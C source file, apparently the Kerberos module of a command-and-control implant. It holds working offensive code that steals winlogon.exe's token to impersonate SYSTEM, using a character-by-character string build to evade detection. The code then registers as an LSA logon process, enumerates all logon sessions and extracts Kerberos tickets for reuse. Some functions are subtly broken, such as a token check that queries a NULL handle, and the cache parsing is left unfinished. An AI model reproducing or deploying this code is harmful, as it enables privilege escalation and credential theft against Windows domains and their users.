
#include <Demon.h>
#include <Core/Kerberos.h>
#include <Core/MiniStd.h>

BOOL IsHighIntegrity(HANDLE TokenHandle)
{
    BOOL                     Success             = FALSE;
    BOOL                     ReturnValue         = TRUE;
    SID_IDENTIFIER_AUTHORITY NtAuthority         = SECURITY_NT_AUTHORITY;
    PSID                     AdministratorsGroup = NULL;

    Success = Instance.Win32.AllocateAndInitializeSid( &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup );
    if ( Success )
    {
        if ( ! Instance.Win32.CheckTokenMembership( NULL, AdministratorsGroup, &ReturnValue ) )
        {
            ReturnValue = FALSE;
        }
        Instance.Win32.FreeSid( AdministratorsGroup );
        AdministratorsGroup = NULL;
    }

    return Success && ReturnValue;
}

DWORD GetProcessIdByName(WCHAR* processName)
{
    HANDLE          hProcessSnap = NULL;
    PROCESSENTRY32W pe32         = { 0 };
    DWORD           Pid          = -1;

    hProcessSnap = Instance.Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if ( hProcessSnap == INVALID_HANDLE_VALUE )
    {
        return Pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if ( ! Instance.Win32.Process32FirstW( hProcessSnap, &pe32 ) )
    {
        Instance.Win32.NtClose( hProcessSnap );
        return Pid;
    }

    do {
        if ( StringCompareW(pe32.szExeFile, processName) == 0 )
        {
            Pid = pe32.th32ProcessID;
            break;
        }

    } while (Instance.Win32.Process32NextW(hProcessSnap, &pe32));

    Instance.Win32.NtClose( hProcessSnap );
    return Pid;
}

BOOL ElevateToSystem()
{
    CLIENT_ID         ClientID       = { 0 };
    NTSTATUS          NtStatus       = 0;
    OBJECT_ATTRIBUTES ObjAttr        = { sizeof( ObjAttr ) };
    WCHAR             winlogon[ 13 ] = { 0 };
    HANDLE            hProcess       = NULL;
    BOOL              ReturnValue    = FALSE;
    HANDLE            hDupToken      = FALSE;
    HANDLE            hToken         = FALSE;
    DWORD             ProcessID      = 0;

    winlogon[ 0 ]  = 'w';
    winlogon[ 12 ] = 0;
    winlogon[ 1 ]  = 'i';
    winlogon[ 2 ]  = 'n';
    winlogon[ 3 ]  = 'l';
    winlogon[ 4 ]  = 'o';
    winlogon[ 5 ]  = 'g';
    winlogon[ 6 ]  = 'o';
    winlogon[ 7 ]  = 'n';
    winlogon[ 8 ]  = '.';
    winlogon[ 9 ]  = 'e';
    winlogon[ 10 ] = 'x';
    winlogon[ 11 ] = 'e';
    ProcessID = GetProcessIdByName(winlogon);
    if (ProcessID == -1)
    {
        PUTS( "Failed to find the PID of Winlogon.exe" )
        return FALSE;
    }

    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
    if ( hProcess )
    {
        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
        {
            if ( Win32_DuplicateTokenEx(
                        hToken,
                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                        NULL,
                        SecurityImpersonation | SecurityIdentification, TokenPrimary, &hDupToken
                    )
                )
            {
                if ( Instance.Win32.ImpersonateLoggedOnUser( hDupToken ) )
                {
                    ReturnValue = TRUE;
                }
                Instance.Win32.NtClose( hDupToken );
            }
            else
            {
                PRINTF( "Win32_DuplicateTokenEx: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
            }
            Instance.Win32.NtClose( hToken );
        }
        else
        {
            PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        }

        Instance.Win32.NtClose( hProcess );
    }
    else
    {
        PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
    }

    return ReturnValue;
}

BOOL IsSystem( HANDLE TokenHandle )
{
    HANDLE                   hToken     = NULL;
    UCHAR                    bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER              pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG                    cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT      = SECURITY_NT_AUTHORITY;
    PSID                     pSystemSid = NULL;
    BOOL                     bSystem    = FALSE;

    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser ) )
    {
        return FALSE;
    }

    if ( ! Instance.Win32.AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid) )
        return FALSE;

    bSystem = Instance.Win32.EqualSid( pTokenUser->User.Sid, pSystemSid );
    Instance.Win32.FreeSid( pSystemSid );

    return bSystem;
}

NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
{
    HANDLE               hLsaLocal = NULL;
    LSA_OPERATIONAL_MODE mode      = 0;
    NTSTATUS             status    = STATUS_SUCCESS;

    if ( ! highIntegrity )
    {
        status = Instance.Win32.LsaConnectUntrusted( &hLsaLocal );
        if ( ! NT_SUCCESS( status ) )
        {
            status = Instance.Win32.LsaNtStatusToWinError( status );
        }
    }
    else
    {
        // AuditPol.exe /set /subcategory:"Security System Extension"
        // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
        // winlogon.exe.
        char* name = "Winlogon";
        /*
        char* name[9] = { 0 }; // Winlogon
        name[ 2 ] =  0x6e;
        name[ 8 ] =  0x00;
        name[ 4 ] =  0x6f;
        name[ 0 ] =  0x57;
        name[ 1 ] =  0x69;
        name[ 7 ] =  0x6e;
        name[ 6 ] =  0x6f;
        name[ 3 ] =  0x6c;
        name[ 5 ] =  0x67;
        */
        STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
        status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
        if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
        {
            if ( IsSystem( hToken ) )
            {
                status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
                if ( ! NT_SUCCESS( status ) )
                {
                    status = Instance.Win32.LsaNtStatusToWinError( status );
                }
            }
            else
            {
                if ( ElevateToSystem() )
                {
                    status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
                    if ( ! NT_SUCCESS(status) )
                    {
                        status = Instance.Win32.LsaNtStatusToWinError( status );
                    }
                    Instance.Win32.RevertToSelf();
                }
                else
                {
                    status = NtGetLastError();
                }
            }
        }
    }
    *hLsa = hLsaLocal;
    return status;
}

NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
{
    PLOGON_SESSION_DATA          sessionData = NULL;
    PSECURITY_LOGON_SESSION_DATA logonData   = NULL;
    NTSTATUS                     status      = STATUS_UNSUCCESSFUL;

    sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof( LOGON_SESSION_DATA ) );
    if ( ! sessionData )
        return status;

    if ( luid.LowPart != 0 )
    {
        status = Instance.Win32.LsaGetLogonSessionData( &luid, &logonData );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof(*sessionData->sessionData) );
            if ( sessionData->sessionData != NULL )
            {
                sessionData->sessionCount = 1;
                sessionData->sessionData[0] = logonData;
                *data = sessionData;
            }
            else
            {
                status = STATUS_MEMORY_NOT_ALLOCATED;
            }
        }
    }
    else
    {
        ULONG logonSessionCount;
        PLUID logonSessionList;
        status = Instance.Win32.LsaEnumerateLogonSessions( &logonSessionCount, &logonSessionList );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, logonSessionCount * sizeof(*sessionData->sessionData) );
            if ( sessionData->sessionData != NULL )
            {
                sessionData->sessionCount = logonSessionCount;
                for ( int i = 0; i < logonSessionCount; i++ )
                {
                    LUID luid2 = logonSessionList[i];
                    status = Instance.Win32.LsaGetLogonSessionData( &luid2, &logonData );
                    if ( NT_SUCCESS(status) )
                    {
                        sessionData->sessionData[i] = logonData;
                    }
                    else
                    {
                        sessionData->sessionData[i] = NULL;
                    }
                }
                Instance.Win32.LsaFreeReturnBuffer( logonSessionList );
                *data = sessionData;
            }
            else
            {
                status = STATUS_MEMORY_NOT_ALLOCATED;
            }
        }
    }

    return status;
}


NTSTATUS ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize )
{
    KERB_RETRIEVE_TKT_REQUEST* retrieveRequest = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* retrieveResponse = NULL;
    ULONG responseSize = sizeof( KERB_RETRIEVE_TKT_REQUEST ) + targetName.MaximumLength;
    retrieveRequest = Instance.Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
    if ( retrieveRequest == NULL )
    {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = ( PWSTR )( (PBYTE )retrieveRequest + sizeof( KERB_RETRIEVE_TKT_REQUEST ));
    MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );

    NTSTATUS protocolStatus;
    NTSTATUS status = STATUS_SUCCESS;
    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse,
                                                  &responseSize, &protocolStatus );
    Instance.Win32.LocalFree( retrieveRequest );
    if ( NT_SUCCESS( status ))
    {
        if ( NT_SUCCESS( protocolStatus ))
        {
            if ( responseSize > 0 )
            {
                ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
                PUCHAR returnTicket = Instance.Win32.LocalAlloc( LPTR, size * sizeof( UCHAR ) );
                if ( returnTicket != NULL )
                {
                    MemCopy( returnTicket, retrieveResponse->Ticket.EncodedTicket, size );
                    *ticket = returnTicket;
                    *ticketSize = size;
                }
                else
                {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                Instance.Win32.LsaFreeReturnBuffer( retrieveResponse );
            }
        }
        else
        {
            status = Instance.Win32.LsaNtStatusToWinError( protocolStatus );
        }
    }
    else
    {
        status = Instance.Win32.LsaNtStatusToWinError( status );
    }

    return status;
}

VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )
{
    // UserName
    StringCopyW( Session->UserName, Data->UserName.Buffer );
    // Domain
    StringCopyW( Session->Domain, Data->LogonDomain.Buffer );
    // LogonId
    Session->LogonId.LowPart  = Data->LogonId.LowPart;
    Session->LogonId.HighPart = Data->LogonId.HighPart;
    // Session
    Session->Session = Data->Session;
    // UserSID
    WCHAR* sid = NULL;
    if ( Instance.Win32.ConvertSidToStringSidW(Data->Sid, &sid) )
    {
        StringCopyW( Session->UserSID, sid );
        Instance.Win32.LocalFree( sid ); sid = NULL;
    }
    // LogonTime
    Session->LogonTime.QuadPart = Data->LogonTime.QuadPart;
    // LogonType
    Session->LogonType = Data->LogonType;
    // AuthenticationPackage
    StringCopyW( Session->AuthenticationPackage, Data->AuthenticationPackage.Buffer );
    // LogonServer
    StringCopyW( Session->LogonServer, Data->LogonServer.Buffer );
    // LogonServerDNSDomain
    StringCopyW( Session->LogonServerDNSDomain, Data->DnsDomainName.Buffer );
    // Upn
    StringCopyW( Session->Upn, Data->Upn.Buffer );
}

PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
{
    //LUID                              luid           = (LUID){.HighPart = 0, .LowPart = 0};
    BOOL                              highIntegrity  = FALSE;
    HANDLE                            hLsa           = NULL;
    ULONG                             authPackage    = 0;
    LSA_STRING                        krbAuth        = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    PLOGON_SESSION_DATA               sessionData    = NULL;
    KERB_QUERY_TKT_CACHE_REQUEST      cacheRequest   = { 0 };
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResponse  = NULL;
    KERB_TICKET_CACHE_INFO_EX         cacheInfo      = { 0 };
    ULONG                             responseSize   = 0;
    NTSTATUS                          protocolStatus = STATUS_SUCCESS;
    NTSTATUS                          status         = STATUS_SUCCESS;
    PSESSION_INFORMATION              Sessions       = NULL;
    PSESSION_INFORMATION              NewSession     = NULL;
    PSESSION_INFORMATION              TmpSession     = NULL;

    if ( ! hToken )
        return NULL;

    highIntegrity = IsHighIntegrity( hToken );
    if ( ! highIntegrity )
    {
        PUTS( "[!] Not in high integrity." );
        return NULL;
    }

    status = GetLsaHandle( hToken, highIntegrity, &hLsa );
    if ( ! NT_SUCCESS( status ) || ! hLsa )
    {
        PRINTF( "[!] GetLsaHandle %ld\n", status );
        return NULL;
    }

    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
        return NULL;
    }

    status = GetLogonSessionData( luid, &sessionData );
    if ( ! NT_SUCCESS( status ) || ! sessionData )
    {
        PRINTF( "[!] GetLogonSessionData: %lx", status );
        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
        return NULL;
    }

    //cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
    cacheRequest.MessageType = 14;
    for ( int i = 0; i < sessionData->sessionCount; i++ )
    {
        if ( sessionData->sessionData[i] == NULL )
            continue;

        NewSession = Instance.Win32.LocalAlloc( LPTR, sizeof( SESSION_INFORMATION ) );
        if ( ! NewSession )
            continue;

        CopySessionInfo( NewSession, sessionData->sessionData[i] );

        if ( ! Sessions )
        {
            NewSession->Next = NULL;
            Sessions = NewSession;
        }
        else
        {
            TmpSession = Sessions;
            while ( TmpSession->Next )
                TmpSession = TmpSession->Next;

            TmpSession->Next = NewSession;
        }

        if ( highIntegrity )
            cacheRequest.LogonId = sessionData->sessionData[i]->LogonId;
        else
            cacheRequest.LogonId = ( LUID ){.HighPart = 0, .LowPart = 0};

        Instance.Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );

        cacheResponse = NULL;
        status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), &cacheResponse, &responseSize, &protocolStatus );
        if ( ! NT_SUCCESS( status ) )
        {
            PRINTF( "[!] LsaCallAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
            continue;
        }

        if ( protocolStatus == STATUS_NO_SUCH_LOGON_SESSION )
            continue;

        if ( ! NT_SUCCESS( protocolStatus ) )
        {
            PRINTF( "[!] LsaCallAuthenticationPackage %lx\n", protocolStatus );
            continue;
        }

        if ( ! cacheResponse )
            continue;

        for ( int j = 0; j < cacheResponse->CountOfTickets; j++ )
        {
            cacheInfo = cacheResponse->Tickets[j];

            // TODO: parse cached tickets
        }
        Instance.Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
    }

    Instance.Win32.LocalFree( sessionData->sessionData ); sessionData->sessionData = NULL;
    Instance.Win32.LocalFree( sessionData ); sessionData = NULL;
    Instance.Win32.LsaDeregisterLogonProcess( hLsa ); hLsa = NULL;

    return Sessions;
}

LUID* GetLUID( HANDLE hToken )
{
    TOKEN_STATISTICS tokenStats = { 0 };
    DWORD            tokenSize  = 0;
    LUID*            luid       = NULL;

    if ( ! hToken )
        return NULL;

    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenStatistics, &tokenStats, sizeof( tokenStats ), &tokenSize ) )
        return NULL;

    luid = Instance.Win32.LocalAlloc( LPTR, sizeof( LUID ) );
    if ( ! luid )
        return NULL;

    luid->HighPart = tokenStats.AuthenticationId.HighPart;
    luid->LowPart  = tokenStats.AuthenticationId.LowPart;

    return luid;
}
